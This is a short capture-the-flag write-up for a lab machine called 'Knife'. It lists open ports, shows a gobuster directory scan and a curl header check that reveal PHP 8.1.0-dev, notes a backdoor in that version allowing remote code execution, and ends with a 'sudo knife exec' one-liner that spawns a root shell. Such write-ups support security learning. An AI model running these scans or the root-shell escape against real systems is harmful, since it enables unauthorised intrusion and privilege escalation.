# Knife

### Reconnaissance

- 22/tcp SSH OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
- 80/tcp HTTP Apache httpd 2.4.41 ((Ubuntu))

gobuster scan reveals index.php

`gobuster dir -u http://10.10.10.242 -w /usr/share/wordlists/dirb/common.txt -t 100`

Use curl to view headers of index.php reveling the PHP version as 8.1.0-dev

`curl -I http://10.10.10.242/index.php`

### Exploitation

This version of PHP has a back door allowing RCE

### Privilege Escalation

User may run /usr/bin/knife as root spawning a root shell

`sudo knife exec -E 'exec "/bin/sh"'`
